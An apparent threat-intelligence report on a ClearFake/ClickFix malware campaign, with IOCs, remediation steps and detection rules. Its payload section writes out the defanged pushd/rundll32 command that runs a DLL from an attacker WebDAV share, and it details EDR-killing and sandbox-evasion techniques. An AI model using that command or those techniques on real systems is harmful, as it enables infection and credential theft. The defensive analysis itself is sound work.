# Technical Analysis Report: ClearFake WebDAV Infection Chain Delivering Amatera Stealer, ZigCryptoStealer, and NetSupport Manager (2026-09-10)

Prepared by: Actioner
Classification: TLP:WHITE
Date: 2026-09-10
Version: 1.0

## Executive Summary

Cisco Talos identified a sophisticated multi-stage malware delivery chain leveraging the ClearFake framework -- a JavaScript injection platform that uses compromised websites, Cloudflare Workers, and BNB Smart Chain (BSC) blockchain contracts to serve malicious payloads. The campaign uses a ClickFix social engineering technique presenting a fake Google reCAPTCHA prompt that instructs victims to paste a clipboard-injected command into the Windows Run dialog. This command mounts a remote WebDAV share (leaguejazire[.]com) and executes a malicious DLL via `rundll32.exe` ordinal invocation, delivering either Amatera Stealer (via "pf.ch") or a separate loader chain (via "verification.google") that deploys NetSupport Manager for persistent remote access.

The campaign deploys up to five secondary payloads from the Amatera branch alone: the Amatera credential stealer itself (targeting 100+ cryptocurrency wallet locations, password managers, and authenticator apps), a NativeAOT DLL side-loading chain that injects ZigCryptoStealer into a suspended explorer.exe process for cryptocurrency clipboard hijacking, a vulnerable kernel driver (DCRCVDrv.sys) for BYOVD-based EDR process termination, and a Go-based reverse proxy using HashiCorp Yamux multiplexing. First observed targeting a Ukrainian government organization in April 2026, the campaign is broadly distributed with ZigCryptoStealer queries observed from 98 countries. Talos tracks the verification.google branch operator as UAT-10820.

## Background: ClearFake and ClickFix Social Engineering

ClearFake is a JavaScript-based malware delivery framework active since at least 2023 that injects fake browser update or verification prompts into compromised websites. The framework evolved to incorporate "EtherHiding" -- using blockchain smart contracts as immutable, censorship-resistant hosting for payload configuration and C2 addresses. The ClickFix variant further evolved the social engineering by replacing fake update prompts with fake CAPTCHA verification dialogs that instruct users to execute commands via the Windows Run dialog, exploiting users' trust in CAPTCHA flows. This campaign represents a significant escalation in complexity, combining blockchain-stored payloads, WebDAV-based delivery, and multi-family malware deployment in parallel chains.

## Attack Timeline (All Times UTC)

| Timestamp | Event |
|-----------|-------|
| 2026-03-16 | ZigCryptoStealer BNB Smart Chain contract (0x7CC3...ba83) deployed |
| 2026-04-XX | First observed targeting -- Ukrainian government organization |
| 2026-04-03 | Telegra[.]ph dead-drop page created for Amatera pf.ch C2 resolution |
| 2026-06-30 -- 2026-07-05 | ZigCryptoStealer C2 domain: fd[.]gstats-api-contact[.]cc |
| 2026-07-05 -- 2026-07-09 | ZigCryptoStealer C2 domain: pkg[.]vogueatelier[.]cc |
| 2026-07-09 -- 2026-07-12 | ZigCryptoStealer C2 domain: kffd3[.]vogueatelier[.]cc |
| 2026-07-12 -- 2026-07-18 | ZigCryptoStealer C2 domain: kffd3[.]vexlatech[.]cc |
| 2026-07-18 -- 2026-07-26 | ZigCryptoStealer C2 domain: static[.]quorashift[.]cc |
| 2026-07-26 -- 2026-07-30 | ZigCryptoStealer C2 domain: lb[.]propertyfind[.]cc |
| 2026-09-10 | Cisco Talos publishes analysis |

## Root Cause: Compromised Website with Cloudflare Worker Injection

Initial access leverages compromised legitimate websites where a malicious Cloudflare Worker intercepts and modifies page content to inject JavaScript. The injected script queries BNB testnet smart contract `0x886d310Ac23e05EA705e24E513D19f53793832A9` via the `bsc[.]rpc[.]blxrbdn[.]com` RPC endpoint. The response is Base64-decoded and evaluated as JavaScript in the browser context. The script performs environment checks (headless browser detection, OS identification) and routes to OS-specific contracts: `0x46790e2Ac7F3CA5a7D1bfCe312d11E91d23383Ff` (Windows) or `0x68DcE15C1002a2689E19D33A3aE509DD1fEb11A5` (macOS). A victim identifier is generated and stored in a `cjs_id` cookie for tracking goal achievement thresholds. The ClickFix overlay then presents the victim with a fake Google CAPTCHA checkbox and instructions to paste a command into the Windows Run dialog.

## Technical Analysis of the Malicious Payload

### 1. ClickFix Clipboard Command and WebDAV Execution

The clipboard command uses Windows delayed expansion to reconstruct the execution command at runtime:

```
pushd \\leaguejazire[.]com\<randomized_subdomain>\<victim_id> && rundll32.exe pf.ch,#1 && popd
```

The `pushd` command activates the Windows WebClient service and mounts the remote WebDAV share as a network drive. The randomized subdomain and victim-specific path provide per-target tracking. `rundll32.exe` (32-bit) then loads and executes the DLL by ordinal #1. Two DLL variants have been observed:

- **pf.ch** -- exports function `moor`; delivers Amatera Stealer + secondary payloads
- **verification.google** -- exports function `CfgInspectModuleData`; delivers NetSupport Manager

### 2. Loader Chains

#### pf.ch Loader (Amatera Branch)

The pf.ch DLL is a packed loader using vectored exception handling (VEH) and XOR obfuscation. It uses a "hit" event synchronization pattern before unpacking and employs Windows fibers for control flow transfer. An embedded blob is decoded via XOR and LZNT1 decompression, producing the 32-bit Amatera Stealer payload with no import table, which executes entirely in memory without being written to disk.

#### verification.google Loader (NetSupport Branch)

The verification.google DLL employs control flow flattening, dynamic API resolution via hashing, and direct WoW64 syscall stubs to evade user-mode API hooks. It maps the legitimate `dbghelp.dll` into memory and overwrites its code section with the unpacked payload (module stomping/DLL hollowing), then transfers execution to the overwritten region. Syscall numbers are decoded at runtime and 32-to-64-bit transitions are performed directly.

### 3. C2 Infrastructure

**Amatera C2 (pf.ch branch):**
- Dead-drop resolver: `telegra[.]ph/Functions-04-03` contains Base64-encoded IP `MTQ1LjI0OS4xMDkuMTQ3` decoding to `145[.]249[.]109[.]147`
- Protocol: TLS-encrypted HTTP with ECDH key exchange + ChaCha20-Poly1305 encryption
- Configuration XOR key: `852149723\x00`
- Initial command: `GetEndpoints` to obtain randomized URI paths
- Configuration contains 400+ collection rule entries for browsers, wallets, credentials

**Amatera C2 (verification.google branch):**
- Hardcoded C2: `45[.]150[.]34[.]2`
- TLS SNI and HTTP Host header spoofed as `github[.]com`
- Same GetEndpoints + ChaCha20-Poly1305 protocol

**ZigCryptoStealer C2 (EtherHiding):**
- BNB Smart Chain contract `0x7CC3cFC1Ac007B8c6566fD2C7419b15a75473468` queried via `eth_call` disguised as ERC-20 token balance check
- `setData(string)` function stores current C2 domain; 39 updates observed through July 2026
- Six active C2 domains rotated during July 2026 period

**NetSupport Manager C2:**
- Gateway: `paternal-angrily[.]com:443`
- HTTP Gateway IP: `212[.]118[.]56[.]166` (Russia-based)
- Polling interval: 60 seconds
- License: KAKAN (serial NSM789508)

**Go Reverse Proxy C2:**
- WebSocket Secure endpoint: `wss://update[.]dubbedmuch[.]cc/`
- Multiplexing: HashiCorp Yamux protocol
- Identification: Windows MachineGuid + hostname

### 4. Platform-Specific Behavior

#### Windows

The primary target platform. Two parallel infection chains deliver different payload combinations:

**pf.ch chain:** Amatera Stealer (credential/crypto theft) + NativeAOT DLL side-loading chain (Chrome `platform_experience_helper.exe` loading malicious `secur32.dll`) delivering ZigCryptoStealer (clipboard hijacking) + vulnerable DCRCVDrv.sys driver (EDR termination) + Go reverse proxy (network tunneling).

**verification.google chain:** Module-stomped loader delivering NetSupport Manager (full remote access) with PowerShell download stage from `hxxps://phys[.]stunned-amniotic[.]com/hub[.]log` and scheduled task persistence at user logon.

#### macOS

BNB contract `0x68DcE15C1002a2689E19D33A3aE509DD1fEb11A5` routes macOS targets to `riyazinikokar[.]xyz` for delivery. Specific macOS payload details were not fully elaborated in the source analysis.

### 5. Anti-Forensics / Evasion Techniques

**Loader-Level Evasion:**
- Vectored exception handling and XOR obfuscation (pf.ch)
- Control flow flattening and API hashing (verification.google)
- Direct WoW64 syscall stubs bypassing user-mode API hooks (verification.google)
- Module stomping of legitimate dbghelp.dll in memory
- Memory-only payload execution (Amatera never touches disk)
- Windows fibers for control flow transfer

**Sandbox/VM Detection (NetSupport PowerShell stage):**
1. Volume serial comparison to hardcoded value `4E014A2F`
2. System uptime threshold (must be > 10 minutes)
3. NtDelayExecution timing check (< 400ms elapsed = sandbox)
4. CPU core count check (passes if < 3 processors)
5. Physical memory check (must be >= 3.2 GiB)
6. Video adapter memory check (must be >= 384 MiB)
7. Virtual graphics adapter detection against 36 VM indicator strings (VirtualBox, VMware, Hyper-V, cloud platforms)

**Network-Level Evasion:**
- TLS SNI and HTTP Host header spoofing as `github[.]com`
- Decoy HTTPS requests to legitimate developer services (GitHub API, npm, Docker Hub, PyPI, NuGet, PowerShell Gallery)
- Dead-drop C2 resolution via Telegraph pages and Steam community profiles
- Blockchain-based infrastructure (EtherHiding) for censorship-resistant C2 configuration
- Rapid C2 domain rotation (6 domains in ~30 days)

**EDR Evasion:**
- BYOVD via DCRCVDrv.sys driver (MOCOMSYS/DCRC) exposing `\Device\DCRCVDRV_U`
- IOCTL `0x2205c0` calls `ZwTerminateProcess` for kernel-mode EDR process termination
- Process name hashing to match target EDR products
- IOCTL handler lacks authorization checks

## Indicators of Compromise (IOCs)

> **Defanging Convention:** All IOCs in this report use defanged notation to prevent accidental resolution or click-through:
> - URLs: `hxxps://` or `hxxp://` (e.g., `hxxps://evil[.]com/payload`)
> - Domains: `[.]` replacing dots (e.g., `evil[.]com`, `c2[.]attacker[.]net`)
> - IP addresses: `[.]` replacing dots (e.g., `1[.]2[.]3[.]4`)

### File System

| Platform | Path / Filename | Hash (SHA256) | Description |
|----------|----------------|---------------|-------------|
| Windows | pf.ch | -- | Amatera Stealer DLL loader (WebDAV delivery) |
| Windows | verification.google | -- | NetSupport Manager DLL loader (WebDAV delivery) |
| Windows | secur32.dll | -- | NativeAOT loader for DLL side-loading |
| Windows | platform_experience_helper.exe | -- | Legitimate Chrome binary (side-loading host) |
| Windows | DCRCVDrv.sys | -- | Vulnerable BYOVD driver for EDR termination |
| Windows | hypersnap.exe (client32.exe) | -- | Renamed NetSupport Manager client |
| Windows | client32.ini | -- | NetSupport Manager configuration |
| Windows | jquery.min.js archive | `279d04c0cfd700c8bcb9acbed528131d3ffef8e25d12713e8649772739aecb92` | Chrome DLL side-loading archive |
| Windows | Go reverse proxy | `1819827e17f31e72d456158b6b9c90af25a65945f6f05d04a060da9f24179b25` | Go proxy-panel binary |
| Windows | Shellcode blob | `643ef35536ff9273fb84b8504467b1a5645cd3ffd5476d64b99244b02131b205` | Go proxy shellcode loader |
| Windows | NetSupport ZIP | `bd36f4c15fe0acb6748da5ed12e45dcc37d412385812c078d1e4f04730e9f69b` | NetSupport Manager archive |

### Network

| Type | Value | Context |
|------|-------|---------|
| IP | 145[.]249[.]109[.]147 | Amatera C2 (pf.ch branch) |
| IP | 45[.]150[.]34[.]2 | Amatera C2 (verification.google branch) |
| IP | 212[.]118[.]56[.]166 | NetSupport Manager HTTP Gateway |
| Domain | leaguejazire[.]com | WebDAV delivery (randomized subdomains) |
| Domain | riyazinikokar[.]xyz | macOS delivery endpoint |
| Domain | lb[.]propertyfind[.]cc | ZigCryptoStealer C2 |
| Domain | static[.]quorashift[.]cc | ZigCryptoStealer C2 |
| Domain | kffd3[.]vexlatech[.]cc | ZigCryptoStealer C2 |
| Domain | kffd3[.]vogueatelier[.]cc | ZigCryptoStealer C2 |
| Domain | pkg[.]vogueatelier[.]cc | ZigCryptoStealer C2 |
| Domain | fd[.]gstats-api-contact[.]cc | ZigCryptoStealer C2 |
| Domain | update[.]dubbedmuch[.]cc | Go reverse proxy C2 (WSS) |
| Domain | paternal-angrily[.]com | NetSupport Manager HTTP Gateway |
| Domain | kr[.]cedar2glanz[.]ru | NetSupport payload delivery |
| URL | hxxps://phys[.]stunned-amniotic[.]com/hub[.]log | NetSupport installer archive |
| URL | hxxps://telegra[.]ph/Functions-04-03 | Amatera dead-drop C2 resolver |
| URL | hxxps://kr[.]cedar2glanz[.]ru/jewel[.]js | NetSupport PowerShell download |

### Blockchain

| Type | Value | Context |
|------|-------|---------|
| BNB Contract | 0x886d310Ac23e05EA705e24E513D19f53793832A9 | Initial JavaScript payload (testnet) |
| BNB Contract | 0x46790e2Ac7F3CA5a7D1bfCe312d11E91d23383Ff | Windows OS-specific contract |
| BNB Contract | 0x68DcE15C1002a2689E19D33A3aE509DD1fEb11A5 | macOS OS-specific contract |
| BNB Contract | 0x7CC3cFC1Ac007B8c6566fD2C7419b15a75473468 | ZigCryptoStealer C2 config contract |

### Behavioral

- WebDAV mount via `pushd` command to UNC path followed by `rundll32.exe` ordinal execution
- Chrome component `platform_experience_helper.exe` loading `secur32.dll` from non-system directory
- NetSupport Manager `client32.exe` renamed to `hypersnap.exe`
- explorer.exe launched in suspended state for process injection
- DCRCVDrv.sys driver loaded and IOCTL `0x2205c0` invoked for process termination
- TLS connections with SNI `github[.]com` to non-GitHub IP addresses
- DNS queries to `.cc` TLD domains with frequent rotation
- PowerShell scripts checking volume serial `4E014A2F` and NtDelayExecution timing

## MITRE ATT&CK Mapping

| TID | Technique | Observed Behavior |
|-----|-----------|-------------------|
| T1189 | Drive-by Compromise | Compromised websites with injected ClearFake JavaScript |
| T1204.001 | User Execution: Malicious Link | ClickFix CAPTCHA social engineering tricking users into Run dialog execution |
| T1059.001 | Command and Scripting Interpreter: PowerShell | NetSupport installer PowerShell download and environment checks |
| T1059.003 | Command and Scripting Interpreter: Windows Command Shell | pushd + rundll32 clipboard command execution |
| T1218.011 | System Binary Proxy Execution: Rundll32 | rundll32.exe executing DLL exports by ordinal #1 |
| T1574.002 | Hijack Execution Flow: DLL Side-Loading | Chrome platform_experience_helper.exe loading malicious secur32.dll |
| T1055 | Process Injection | NativeAOT loader injecting into suspended explorer.exe |
| T1036.005 | Masquerading: Match Legitimate Name or Location | client32.exe renamed to hypersnap.exe; DLLs named "verification.google" |
| T1140 | Deobfuscate/Decode Files or Information | XOR decryption, LZNT1 decompression, Base64 decoding throughout chain |
| T1027 | Obfuscated Files or Information | Exception-driven control flow, API hashing, control flow flattening |
| T1562.001 | Impair Defenses: Disable or Modify Tools | BYOVD via DCRCVDrv.sys for EDR process termination |
| T1014 | Rootkit | Vulnerable driver (BYOVD) for kernel-mode process termination |
| T1497.001 | Virtualization/Sandbox Evasion: System Checks | Volume serial, timing, CPU, RAM, GPU checks in PowerShell |
| T1071.001 | Application Layer Protocol: Web Protocols | HTTPS C2 with SNI spoofing; WebSocket Secure for Go proxy |
| T1568.002 | Dynamic Resolution: Domain Generation Algorithms | Blockchain contract-based C2 resolution (EtherHiding) |
| T1008 | Fallback Channels | Telegraph dead-drop, Steam profiles, blockchain contracts for C2 |
| T1573.001 | Encrypted Channel: Symmetric Cryptography | ChaCha20-Poly1305 encrypted C2 communications |
| T1105 | Ingress Tool Transfer | Secondary payload download via Amatera tasking |
| T1115 | Clipboard Data | ZigCryptoStealer clipboard polling and cryptocurrency address replacement |
| T1219 | Remote Access Software | NetSupport Manager deployed for persistent remote control |
| T1053 | Scheduled Task/Job | User logon scheduled task for NetSupport persistence |

## Impact Assessment

The campaign represents a significant threat due to its breadth, sophistication, and financial impact potential. ZigCryptoStealer contract queries were observed from **98 countries** for the most recent C2 domain alone, suggesting widespread global distribution. Amatera Stealer targets over **100 cryptocurrency wallet locations**, multiple password managers (KeePass, Bitwarden, 1Password, RoboForm, NordPass), authenticator apps (WinAuth, Authy), and messaging applications (Telegram, Signal, WhatsApp). The BYOVD component actively terminates EDR products, degrading defensive visibility. The use of blockchain-based infrastructure (BNB Smart Chain) makes takedown significantly more difficult than traditional domain-based C2, as smart contract data is immutable once deployed. The Go reverse proxy component creates a potential pivot point for further network compromise. The campaign shows active development with rapid C2 rotation (six domains in approximately 30 days) and ongoing smart contract updates (39 setData calls observed).

## Detection & Remediation

### Immediate Detection

```powershell
# Check for WebDAV-mounted drives from suspicious domains
net use | Select-String "leaguejazire"

# Check for renamed NetSupport Manager
Get-Process -Name hypersnap -ErrorAction SilentlyContinue | Select-Object Path, Id

# Check for DCRCVDrv.sys driver
Get-WmiObject Win32_SystemDriver | Where-Object { $_.PathName -like "*DCRCVDrv*" }

# Check for suspicious scheduled tasks
Get-ScheduledTask | Where-Object { $_.Actions.Execute -like "*hypersnap*" }

# Check DNS logs for C2 domains
Get-DnsClientCache | Where-Object { $_.Entry -match "leaguejazire|propertyfind|quorashift|vexlatech|vogueatelier|dubbedmuch|stunned-amniotic|paternal-angrily|cedar2glanz" }
```

### Remediation

1. **Containment:** Isolate affected hosts from the network immediately. Block all IOC domains and IPs at the perimeter firewall and DNS resolver.
2. **EDR Verification:** Confirm EDR agents are still running on potentially affected hosts -- the BYOVD component may have terminated them.
3. **Driver Removal:** Identify and remove DCRCVDrv.sys from affected systems. Implement driver block policies via WDAC or equivalent.
4. **Credential Rotation:** Rotate all credentials stored in browsers, password managers, and cryptocurrency wallets on affected systems. Revoke and regenerate all authentication tokens.
5. **Cryptocurrency Wallet Audit:** Review all recent cryptocurrency transactions from affected systems for unauthorized transfers. Move remaining funds to new wallets generated on clean systems.
6. **Scheduled Task Cleanup:** Remove malicious scheduled tasks launching hypersnap.exe or similar renamed NetSupport clients.
7. **WebDAV Service Hardening:** Disable the WebClient service on endpoints where not required (`sc config WebClient start= disabled`).

### Long-Term Hardening

1. Block WebDAV connections to external/untrusted servers via group policy or firewall rules.
2. Implement application whitelisting to prevent execution from temporary/user-writable directories.
3. Deploy WDAC or equivalent driver block policies to prevent loading of known vulnerable drivers.
4. Enable PowerShell Script Block Logging (Event ID 4104) and Module Logging for sandbox evasion detection.
5. Monitor for TLS connections where the SNI does not match the destination IP's expected organization.
6. Consider blocking or monitoring BNB testnet RPC endpoints if not required for business operations.

## Detection Rules

These rules cover the ClearFake WebDAV campaign across host behavioral indicators (Sigma), network traffic (Suricata/Snort), and file-level artifacts (YARA). All rules are advisory-specific and tuned for this campaign's distinctive artifacts. The TLS SNI rule (sid:2100107) will require tuning as it broadly matches any `github[.]com` SNI -- pair it with destination IP exclusions for GitHub's actual IP ranges.

### Sigma Rules

#### 1. ClearFake WebDAV Execution via Pushd and Rundll32

Detects the ClickFix clipboard command pattern: `pushd` to a UNC path or `rundll32` with ordinal `#1` invocation.

<!-- audit: sigma convert --without-pipeline -t splunk: exit 0; sigma convert --without-pipeline -t log_scale: exit 0; sigma check: skipped (MITRE ATT&CK data fetch blocked by proxy 403). Condition uses OR to catch either the pushd UNC mount or the rundll32 ordinal execution independently. -->

**Status:** Compiled (splunk, logscale) | Confidence: medium

```yaml
title: ClearFake WebDAV Execution via Pushd and Rundll32
id: 0b11cc62-e4cd-403b-aa9b-85bf5bed7a32
status: experimental
description: >
    Detects the ClearFake ClickFix infection chain where a victim is tricked into
    executing a pushd command to mount a remote WebDAV share followed by rundll32
    executing a DLL by ordinal number. This matches the clipboard-pasted command
    used in the ClearFake campaign delivering Amatera Stealer.
references:
    - https://blog.talosintelligence.com/clearfake-webdav-infection-chain/
author: Actioner
date: 2026-09-10
tags:
    - attack.t1204.001
    - attack.t1218.011
logsource:
    category: process_creation
    product: windows
detection:
    selection_pushd:
        CommandLine|contains|all:
            - 'pushd'
            - '\\\\'
    selection_rundll32:
        CommandLine|contains|all:
            - 'rundll32'
            - ',#1'
    condition: selection_pushd or selection_rundll32
falsepositives:
    - Legitimate network drive mapping scripts using pushd with UNC paths
    - Administrative tools using rundll32 with ordinal exports
level: high
```

#### 2. Chrome Component DLL Side-Loading of Secur32

Detects `platform_experience_helper.exe` loading `secur32.dll` from outside the Windows system directories.

<!-- audit: sigma convert --without-pipeline -t splunk: exit 0; sigma convert --without-pipeline -t log_scale: exit 0. Requires Sysmon EID 7 (image_load) telemetry. Filter excludes legitimate system32/syswow64 paths. -->

**Status:** Compiled (splunk, logscale) | Confidence: medium

```yaml
title: Chrome Component DLL Side-Loading of Secur32
id: cf7478b2-9a73-44da-9e30-efe07aa9fc87
status: experimental
description: >
    Detects a legitimate Google Chrome helper binary (platform_experience_helper.exe)
    loading a suspicious secur32.dll from a non-system directory, indicating DLL
    side-loading as used in the ClearFake campaign to deliver ZigCryptoStealer
    and an EDR termination driver.
references:
    - https://blog.talosintelligence.com/clearfake-webdav-infection-chain/
author: Actioner
date: 2026-09-10
tags:
    - attack.t1574.002
    - attack.t1105
logsource:
    category: image_load
    product: windows
detection:
    selection:
        Image|endswith: '\platform_experience_helper.exe'
        ImageLoaded|endswith: '\secur32.dll'
    filter_system:
        ImageLoaded|startswith:
            - 'C:\Windows\System32\'
            - 'C:\Windows\SysWOW64\'
    condition: selection and not filter_system
falsepositives:
    - Highly unlikely in legitimate environments as secur32.dll should only load from system directories
level: high
```

#### 3. Renamed NetSupport Manager Client Execution as Hypersnap

Detects NetSupport Manager `client32.exe` renamed and running as `hypersnap.exe`.

<!-- audit: sigma convert --without-pipeline -t splunk: exit 0; sigma convert --without-pipeline -t log_scale: exit 0. Requires Sysmon EID 1 with OriginalFileName populated from PE metadata. -->

**Status:** Compiled (splunk, logscale) | Confidence: medium

```yaml
title: Renamed NetSupport Manager Client Execution as Hypersnap
id: e826726b-7ded-4b56-a08f-2e307bd28ad2
status: experimental
description: >
    Detects execution of NetSupport Manager client32.exe renamed to hypersnap.exe,
    a technique used in the ClearFake verification.google branch for deploying
    a remote access tool with hidden UI and silent operation mode.
references:
    - https://blog.talosintelligence.com/clearfake-webdav-infection-chain/
author: Actioner
date: 2026-09-10
tags:
    - attack.t1036.005
    - attack.t1219
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        OriginalFileName: 'client32.exe'
        Image|endswith: '\hypersnap.exe'
    condition: selection
falsepositives:
    - Extremely unlikely — the original HyperSnap software is not based on client32.exe
level: high
```

#### 4. ClearFake Campaign C2 Domain DNS Lookup

Detects DNS queries to 11 known C2 domains across all payload families in this campaign.

<!-- audit: sigma convert --without-pipeline -t splunk: exit 0; sigma convert --without-pipeline -t log_scale: exit 0. IOC-specific rule; domains are purpose-registered for this campaign. Uses endswith for subdomain coverage plus exact match for apex domains. -->

**Status:** Compiled (splunk, logscale) | Confidence: high (IOC-specific)

```yaml
title: ClearFake Campaign C2 Domain DNS Lookup
id: 174effa1-c180-43cb-a9d5-8912356678d4
status: experimental
description: >
    Detects DNS queries to known C2 domains associated with the ClearFake WebDAV
    infection chain, including Amatera Stealer dead-drop resolver, ZigCryptoStealer
    C2 domains, NetSupport Manager gateway, and Go reverse proxy endpoints.
references:
    - https://blog.talosintelligence.com/clearfake-webdav-infection-chain/
author: Actioner
date: 2026-09-10
tags:
    - attack.t1071.001
    - attack.t1568.002
logsource:
    category: dns_query
detection:
    selection:
        QueryName|endswith:
            - '.leaguejazire.com'
            - '.riyazinikokar.xyz'
            - '.propertyfind.cc'
            - '.quorashift.cc'
            - '.vexlatech.cc'
            - '.vogueatelier.cc'
            - '.gstats-api-contact.cc'
            - '.dubbedmuch.cc'
            - '.stunned-amniotic.com'
            - '.cedar2glanz.ru'
    selection_exact:
        QueryName:
            - 'leaguejazire.com'
            - 'riyazinikokar.xyz'
            - 'propertyfind.cc'
            - 'quorashift.cc'
            - 'vexlatech.cc'
            - 'vogueatelier.cc'
            - 'gstats-api-contact.cc'
            - 'dubbedmuch.cc'
            - 'stunned-amniotic.com'
            - 'cedar2glanz.ru'
            - 'paternal-angrily.com'
    condition: selection or selection_exact
falsepositives:
    - Unlikely — these domains are purpose-registered for this campaign
level: critical
```

#### 5. ClearFake BYOVD EDR Termination via DCRCVDrv Driver

Detects loading of the vulnerable DCRCVDrv.sys driver used for BYOVD EDR termination.

<!-- audit: sigma convert --without-pipeline -t splunk: exit 0; sigma convert --without-pipeline -t log_scale: exit 0. Requires Sysmon EID 6 (driver_load) or equivalent driver load telemetry. -->

**Status:** Compiled (splunk, logscale) | Confidence: medium
Caveat: May fire in environments with legitimate MOCOMSYS DCRC software.

```yaml
title: ClearFake BYOVD EDR Termination via DCRCVDrv Driver
id: 2d85f0ee-968c-4ea1-9c67-86208cbfc5be
status: experimental
description: >
    Detects loading of the vulnerable DCRCVDrv.sys driver used in the ClearFake
    campaign for Bring Your Own Vulnerable Driver (BYOVD) attacks to terminate
    EDR processes via kernel-mode ZwTerminateProcess calls.
references:
    - https://blog.talosintelligence.com/clearfake-webdav-infection-chain/
author: Actioner
date: 2026-09-10
tags:
    - attack.t1562.001
    - attack.t1014
logsource:
    category: driver_load
    product: windows
detection:
    selection:
        ImageLoaded|endswith: '\DCRCVDrv.sys'
    condition: selection
falsepositives:
    - Legitimate MOCOMSYS DCRC software using this driver — verify with the vendor
level: high
```

#### 6. ClearFake NetSupport Installer Sandbox Evasion Checks

Detects PowerShell script blocks containing the specific anti-sandbox fingerprints used in this campaign.

<!-- audit: sigma convert --without-pipeline -t splunk: exit 0; sigma convert --without-pipeline -t log_scale: exit 0. Requires PowerShell Script Block Logging (EID 4104). Three independent detection branches: volume serial, timing+boot check, or GPU memory check. -->

**Status:** Compiled (splunk, logscale) | Confidence: medium

```yaml
title: ClearFake NetSupport Installer Sandbox Evasion Checks
id: 2d90acbf-950a-47bd-9862-ca047d24ba83
status: experimental
description: >
    Detects PowerShell script blocks performing the specific anti-sandbox checks
    used in the ClearFake NetSupport installer, including volume serial comparison
    to the hardcoded value 4E014A2F and NtDelayExecution timing checks.
references:
    - https://blog.talosintelligence.com/clearfake-webdav-infection-chain/
author: Actioner
date: 2026-09-10
tags:
    - attack.t1497.001
    - attack.t1059.001
logsource:
    category: ps_script
    product: windows
detection:
    selection_serial:
        ScriptBlockText|contains: '4E014A2F'
    selection_timing:
        ScriptBlockText|contains|all:
            - 'NtDelayExecution'
            - 'LastBootUpTime'
    selection_vm_check:
        ScriptBlockText|contains|all:
            - 'AdapterRAM'
            - 'VideoController'
    condition: selection_serial or selection_timing or selection_vm_check
falsepositives:
    - Security testing scripts that check system hardware configuration
    - VM detection utilities
level: medium
```

### Suricata Rules

#### 7-12. ClearFake C2 Domain DNS Queries

Six rules detecting DNS queries to campaign-specific C2 domains (WebDAV delivery, ZigCryptoStealer, Go reverse proxy, NetSupport gateway, NetSupport payload, Amatera payload).

<!-- audit: suricata -T -S suricata_clearfake.rules -l /tmp/actioner: exit 0. All 7 rules validated as a set. IOC-specific DNS rules with nocase matching. -->

**Status:** Compiled (suricata -T exit 0) | Confidence: high (IOC-specific)

```
alert dns $HOME_NET any -> any any (msg:"Actioner - ClearFake WebDAV Delivery Domain DNS Query (leaguejazire.com)"; flow:to_server; dns.query; content:"leaguejazire.com"; nocase; fast_pattern; classtype:trojan-activity; reference:url,blog.talosintelligence.com/clearfake-webdav-infection-chain/; metadata:author Actioner, created_at 2026-09-10; sid:2100101; rev:1;)

alert dns $HOME_NET any -> any any (msg:"Actioner - ClearFake ZigCryptoStealer C2 Domain DNS Query (propertyfind.cc)"; flow:to_server; dns.query; content:"propertyfind.cc"; nocase; fast_pattern; classtype:trojan-activity; reference:url,blog.talosintelligence.com/clearfake-webdav-infection-chain/; metadata:author Actioner, created_at 2026-09-10; sid:2100102; rev:1;)

alert dns $HOME_NET any -> any any (msg:"Actioner - ClearFake Go Reverse Proxy C2 Domain DNS Query (dubbedmuch.cc)"; flow:to_server; dns.query; content:"dubbedmuch.cc"; nocase; fast_pattern; classtype:trojan-activity; reference:url,blog.talosintelligence.com/clearfake-webdav-infection-chain/; metadata:author Actioner, created_at 2026-09-10; sid:2100103; rev:1;)

alert dns $HOME_NET any -> any any (msg:"Actioner - ClearFake NetSupport Gateway Domain DNS Query (paternal-angrily.com)"; flow:to_server; dns.query; content:"paternal-angrily.com"; nocase; fast_pattern; classtype:trojan-activity; reference:url,blog.talosintelligence.com/clearfake-webdav-infection-chain/; metadata:author Actioner, created_at 2026-09-10; sid:2100104; rev:1;)

alert dns $HOME_NET any -> any any (msg:"Actioner - ClearFake NetSupport Payload Domain DNS Query (stunned-amniotic.com)"; flow:to_server; dns.query; content:"stunned-amniotic.com"; nocase; fast_pattern; classtype:trojan-activity; reference:url,blog.talosintelligence.com/clearfake-webdav-infection-chain/; metadata:author Actioner, created_at 2026-09-10; sid:2100105; rev:1;)

alert dns $HOME_NET any -> any any (msg:"Actioner - ClearFake Amatera Payload Domain DNS Query (cedar2glanz.ru)"; flow:to_server; dns.query; content:"cedar2glanz.ru"; nocase; fast_pattern; classtype:trojan-activity; reference:url,blog.talosintelligence.com/clearfake-webdav-infection-chain/; metadata:author Actioner, created_at 2026-09-10; sid:2100106; rev:1;)
```

#### 13. ClearFake Amatera TLS SNI Spoofing

Detects TLS ClientHello with `github[.]com` SNI -- broadly matches and requires tuning with destination IP exclusions for GitHub's real infrastructure.

<!-- audit: suricata -T exit 0 as part of rule set. This rule will produce false positives against real GitHub traffic; intended as a hunting rule to be narrowed by excluding GitHub's IP ranges (e.g., 140.82.112.0/20, 192.30.252.0/22). -->

**Status:** Compiled (suricata -T exit 0) | Confidence: low (requires destination IP tuning)

```
alert tls $HOME_NET any -> $EXTERNAL_NET any (msg:"Actioner - ClearFake Amatera TLS SNI Spoofing github.com to Non-GitHub IP"; flow:established,to_server; tls.sni; content:"github.com"; fast_pattern; threshold:type limit, track by_src, count 1, seconds 600; classtype:trojan-activity; reference:url,blog.talosintelligence.com/clearfake-webdav-infection-chain/; metadata:author Actioner, created_at 2026-09-10; sid:2100107; rev:1;)
```

### Snort Rules

#### 14-17. ClearFake C2 Domain DNS Queries (Snort 3)

Four rules detecting DNS queries to key campaign domains via label-length-encoded content matching.

<!-- audit: Snort 3 is not installed in this environment. Rules follow Snort 3 reference specification with UDP port 53, label-length encoding for DNS names, and proper flow/classtype/metadata options. -->

**Status:** Uncompiled (structural check only) | Confidence: high (IOC-specific)

```
alert udp $HOME_NET any -> any 53 (msg:"Actioner - ClearFake WebDAV Delivery Domain DNS Query (leaguejazire.com)"; flow:to_server; content:"|0d|leaguejazire|03|com|00|", nocase, fast_pattern; classtype:trojan-activity; reference:url,blog.talosintelligence.com/clearfake-webdav-infection-chain/; metadata:author Actioner, created 2026-09-10; sid:2100201; rev:1;)

